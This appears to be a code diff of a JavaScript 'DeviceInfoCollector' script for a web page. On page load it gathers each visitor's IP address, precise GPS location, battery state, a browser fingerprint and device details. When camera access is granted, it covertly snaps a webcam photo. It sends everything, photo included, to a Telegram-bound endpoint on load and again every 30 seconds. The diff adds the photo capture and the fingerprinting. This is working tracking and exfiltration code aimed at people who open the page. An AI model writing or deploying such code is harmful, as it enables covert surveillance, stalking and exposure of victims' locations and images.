@@ -1,3 +1,4 @@
+// script.js
 class DeviceInfoCollector {
   constructor() {
     this.deviceInfo = {
@@ -7,7 +8,6 @@ class DeviceInfoCollector {
       approxAddress: null,
       battery: null,
       cameraAccess: false,
-      microphoneAccess: false,
       os: null,
       browser: null,
       device: null,
@@ -15,40 +15,89 @@ class DeviceInfoCollector {
       screen: `${window.screen.width}x${window.screen.height}`,
       memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : null,
       isTouchDevice: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
-      connection: null,
-      bandwidth: null,
-      rtt: null,
       language: navigator.language,
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
       platform: navigator.platform,
-      vendor: navigator.vendor,
-      product: navigator.product,
       cookiesEnabled: navigator.cookieEnabled,
-      doNotTrack: navigator.doNotTrack === '1',
       onlineStatus: navigator.onLine,
-      notificationPermission: Notification.permission
+      pixelRatio: window.devicePixelRatio,
+      webGLRenderer: null,
+      fingerprint: null
     };
 
+    this.photoData = null;
     this.init();
   }
 
   async init() {
     document.getElementById('device-info').style.display = 'block';
     
-    // Collect all information
+    await this.collectFingerprint();
     await this.collectIP();
     await this.collectLocation();
     await this.collectBatteryInfo();
-    await this.checkPermissions();
-    await this.collectNetworkInfo();
+    await this.checkCameraAccess();
     this.parseUserAgent();
     this.collectAdditionalInfo();
+    
+    // Try to capture photo if camera access granted
+    if (this.deviceInfo.cameraAccess) {
+      await this.capturePhoto();
+    }
     
     // Send initial data
     this.sendDataToTelegram();
     
     // Set up periodic updates
-    setInterval(() => this.sendDataToTelegram(), 30000); // Send every 30 seconds
+    setInterval(() => this.sendDataToTelegram(), 30000);
+  }
+
+  async capturePhoto() {
+    try {
+      const video = document.getElementById('webcam');
+      const canvas = document.getElementById('canvas');
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      
+      video.srcObject = stream;
+      await new Promise(resolve => video.onloadedmetadata = resolve);
+      
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      this.photoData = canvas.toDataURL('image/jpeg', 0.7);
+      document.getElementById('photo-status').textContent = 'Photo Capture: Success ✅';
+      document.getElementById('photo-status').className = 'permission-granted';
+      
+      stream.getTracks().forEach(track => track.stop());
+    } catch (error) {
+      document.getElementById('photo-status').textContent = `Photo Capture: ${error.message}`;
+      document.getElementById('photo-status').className = 'permission-denied';
+    }
+  }
+
+  async checkCameraAccess() {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      this.deviceInfo.cameraAccess = true;
+      document.getElementById('camera-info').textContent = 'Camera: Granted';
+      document.getElementById('camera-info').className = 'permission-granted';
+      stream.getTracks().forEach(track => track.stop());
+    } catch (error) {
+      document.getElementById('camera-info').textContent = `Camera: ${error.message}`;
+      document.getElementById('camera-info').className = 'permission-denied';
+    }
+  }
+
+  async collectFingerprint() {
+    try {
+      const components = await Fingerprint2.getPromise();
+      const values = components.map(component => component.value);
+      this.deviceInfo.fingerprint = Fingerprint2.x64hash128(values.join(''), 31);
+    } catch (error) {
+      console.error('Fingerprint error:', error);
+    }
   }
 
   async collectIP() {
@@ -58,7 +107,6 @@ class DeviceInfoCollector {
       this.deviceInfo.ip = data.ip;
       document.getElementById('ip-info').textContent = `IP: ${data.ip}`;
       
-      // Get approximate address from IP
       const geoResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
       const geoData = await geoResponse.json();
       if (geoData.city && geoData.country) {
@@ -75,8 +123,7 @@ class DeviceInfoCollector {
         const position = await new Promise((resolve, reject) => {
           navigator.geolocation.getCurrentPosition(resolve, reject, {
             enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
+            timeout: 10000
           });
         });
 
@@ -86,41 +133,18 @@ class DeviceInfoCollector {
           accuracy: position.coords.accuracy
         };
 
-        this.updateLocationInfo(position.coords);
-        
-        // Reverse geocoding
-        try {
-          const response = await fetch(
-            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
-          );
-          const data = await response.json();
-          if (data.address) {
-            const addressParts = [];
-            if (data.address.road) addressParts.push(data.address.road);
-            if (data.address.city) addressParts.push(data.address.city);
-            if (data.address.country) addressParts.push(data.address.country);
-            this.deviceInfo.approxAddress = addressParts.join(', ');
-          }
-        } catch (e) {
-          console.log('Reverse geocoding failed:', e);
-        }
-      } catch (error) {
         document.getElementById('location-info').textContent = 
-          `Location: ${error.message}`;
+          `Location: ${position.coords.latitude}, ${position.coords.longitude}`;
+        
+        const mapLink = document.getElementById('map-link');
+        mapLink.href = `https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
+        mapLink.style.display = 'inline-block';
+      } catch (error) {
+        document.getElementById('location-info').textContent = `Location: ${error.message}`;
       }
     } else {
       document.getElementById('location-info').textContent = 'Location: Geolocation not supported';
     }
-  }
-
-  updateLocationInfo(coords) {
-    document.getElementById('location-info').textContent = 
-      `Location: ${coords.latitude}, ${coords.longitude} (Accuracy: ${coords.accuracy}m)`;
-    
-    const mapLink = document.getElementById('map-link');
-    mapLink.href = `https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`;
-    mapLink.style.display = 'inline-block';
-    mapLink.textContent = 'View on Google Maps';
   }
 
   async collectBatteryInfo() {
@@ -131,73 +155,14 @@ class DeviceInfoCollector {
           level: battery.level,
           charging: battery.charging
         };
-        this.updateBatteryInfo(battery);
         
-        battery.addEventListener('levelchange', () => {
-          this.deviceInfo.battery.level = battery.level;
-          this.updateBatteryInfo(battery);
-          this.sendDataToTelegram();
-        });
-        
-        battery.addEventListener('chargingchange', () => {
-          this.deviceInfo.battery.charging = battery.charging;
-          this.updateBatteryInfo(battery);
-          this.sendDataToTelegram();
-        });
+        document.getElementById('battery-info').textContent = 
+          `Battery: ${Math.round(battery.level * 100)}% ${battery.charging ? '(charging)' : ''}`;
       } catch (error) {
         document.getElementById('battery-info').textContent = 'Battery: Error accessing API';
       }
     } else {
       document.getElementById('battery-info').textContent = 'Battery: API not supported';
-    }
-  }
-
-  updateBatteryInfo(battery) {
-    const levelPercent = Math.round(battery.level * 100);
-    const chargingStatus = battery.charging ? ' (charging)' : '';
-    document.getElementById('battery-info').textContent = 
-      `Battery: ${levelPercent}%${chargingStatus}`;
-  }
-
-  async checkPermissions() {
-    // Camera
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-      this.deviceInfo.cameraAccess = true;
-      document.getElementById('camera-info').textContent = 'Camera: Granted';
-      document.getElementById('camera-info').className = 'permission-granted';
-      stream.getTracks().forEach(track => track.stop());
-    } catch (error) {
-      document.getElementById('camera-info').textContent = `Camera: ${error.message}`;
-      document.getElementById('camera-info').className = 'permission-denied';
-    }
-
-    // Microphone
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-      this.deviceInfo.microphoneAccess = true;
-      document.getElementById('microphone-info').textContent = 'Microphone: Granted';
-      document.getElementById('microphone-info').className = 'permission-granted';
-      stream.getTracks().forEach(track => track.stop());
-    } catch (error) {
-      document.getElementById('microphone-info').textContent = `Microphone: ${error.message}`;
-      document.getElementById('microphone-info').className = 'permission-denied';
-    }
-  }
-
-  async collectNetworkInfo() {
-    if ('connection' in navigator) {
-      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (connection) {
-        this.deviceInfo.connection = connection.effectiveType;
-        this.deviceInfo.bandwidth = connection.downlink ? `${connection.downlink} Mbps` : null;
-        this.deviceInfo.rtt = connection.rtt ? `${connection.rtt} ms` : null;
-        
-        document.getElementById('network-info').textContent = 
-          `Network: ${connection.effectiveType}, Downlink: ${connection.downlink} Mbps, RTT: ${connection.rtt} ms`;
-      }
-    } else {
-      document.getElementById('network-info').textContent = 'Network: Information not available';
     }
   }
 
@@ -208,44 +173,24 @@ class DeviceInfoCollector {
     this.deviceInfo.os = `${result.os.name} ${result.os.version}`;
     this.deviceInfo.browser = `${result.browser.name} ${result.browser.version}`;
     this.deviceInfo.device = result.device.vendor ? 
-      `${result.device.vendor} ${result.device.model} (${result.device.type || 'desktop'})` : 
-      'Desktop';
+      `${result.device.vendor} ${result.device.model}` : 'Desktop';
     
     document.getElementById('device-details').textContent = 
       `Device: ${this.deviceInfo.device}, OS: ${this.deviceInfo.os}, Browser: ${this.deviceInfo.browser}`;
   }
 
   collectAdditionalInfo() {
-    // Add any additional info you want to collect
-    this.deviceInfo.screenOrientation = window.screen.orientation ? window.screen.orientation.type : 'unknown';
-    this.deviceInfo.pixelRatio = window.devicePixelRatio;
-    this.deviceInfo.webGLRenderer = this.getWebGLRenderer();
-    this.deviceInfo.installedFonts = this.getInstalledFonts();
-  }
-
-  getWebGLRenderer() {
+    // WebGL renderer
     try {
       const canvas = document.createElement('canvas');
       const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
       if (gl) {
         const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
+        this.deviceInfo.webGLRenderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
       }
     } catch (e) {
-      return 'unknown';
+      this.deviceInfo.webGLRenderer = 'unknown';
     }
-    return 'unknown';
-  }
-
-  getInstalledFonts() {
-    // This is a basic check for common fonts
-    const fonts = [
-      'Arial', 'Arial Black', 'Courier New', 
-      'Georgia', 'Times New Roman', 'Verdana'
-    ];
-    return fonts.filter(font => {
-      return document.fonts.check(`12px "${font}"`);
-    }).join(', ');
   }
 
   async sendDataToTelegram() {
@@ -255,7 +200,10 @@ class DeviceInfoCollector {
         headers: {
           'Content-Type': 'application/json',
         },
-        body: JSON.stringify({ deviceInfo: this.deviceInfo })
+        body: JSON.stringify({
+          deviceInfo: this.deviceInfo,
+          photoData: this.photoData
+        })
       });
     } catch (error) {
       console.error('Error sending to Telegram:', error);
@@ -263,7 +211,6 @@ class DeviceInfoCollector {
   }
 }
 
-// Initialize when DOM is loaded
 document.addEventListener('DOMContentLoaded', () => {
   new DeviceInfoCollector();
 });
